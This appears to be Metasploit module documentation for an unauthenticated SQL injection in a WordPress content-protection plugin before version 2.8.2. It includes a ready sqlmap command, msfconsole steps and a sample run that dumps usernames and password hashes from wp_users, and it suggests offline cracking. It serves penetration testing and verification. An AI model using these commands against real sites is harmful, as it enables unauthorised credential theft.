## Vulnerable Application

Secure Copy Content Protection and Content Locking, a WordPress plugin,
prior to 2.8.2 is affected by an unauthenticated SQL injection via the
`sccp_id[]` parameter.

Remote attackers can exploit this vulnerability to dump usernames and password hashes
from the`wp_users` table of the affected WordPress installation. These password hashes
can then be cracked offline using tools such as Hashcat to obtain valid login
credentials for the affected WordPress installation.

A vulnerable version (2.8.1) of the plugin can be downloaded
[here](https://downloads.wordpress.org/plugin/secure-copy-content-protection.2.8.1.zip)

The output from running this module will be somewhat similar to the following `sqlmap` command:

```
sqlmap --dbms=mysql -u "http://1.1.1.1/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)*&type=json" --technique T -T wp_users -C user_login,user_pass --dump
```

## Verification Steps

1. Install the plugin, use defaults
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wp_secure_copy_content_protection_sqli`
4. Do: `set rhosts [ip]`
5. Optionally set `USER_COUNT` to the number of users you want to dump the credentials of.
5. Do: `run`
6. *Verify* that `USER_COUNT` number of users's usernames and password hashes are gathered from the `wp_users` table of the target WordPress installation.
## Options

### ACTION: List Users

This action exploits the unauthenticated SQL injection and lists `USER_COUNT`
users and password hashes from the `wp_users` table of the affected WordPress installation.

### USER_COUNT

If action `List Users` is selected (default), this is the number of users to enumerate the credentials of.
The larger this number, the more time it will take for the module to run.  Defaults to `3`.

## Scenarios

### Secure Copy Content Protection and Content Locking 2.8.1 on Wordpress 5.7.5 on Ubuntu 20.04

```
resource (secure_copy.rb)> use auxiliary/scanner/http/wp_secure_copy_content_protection_sqli
resource (secure_copy.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (secure_copy.rb)> set verbose true
verbose => true
resource (secure_copy.rb)> set limit 1
limit => 1
resource (secure_copy.rb)> run
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/secure-copy-content-protection/readme.txt
[*] Checking /wp-content/plugins/secure-copy-content-protection/Readme.txt
[*] Checking /wp-content/plugins/secure-copy-content-protection/README.txt
[*] Found version 2.8.1 in the plugin
[+] The target appears to be vulnerable.
[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(dwOr) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) dwOr from wp_users limit 3) fOXVNQ)
[*] {SQLi} Encoded to (select group_concat(dwOr) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x16,0)),ifnull(user_pass,repeat(0xa1,0))) as binary) dwOr from wp_users limit 3) fOXVNQ)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] Dumped table contents:
wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
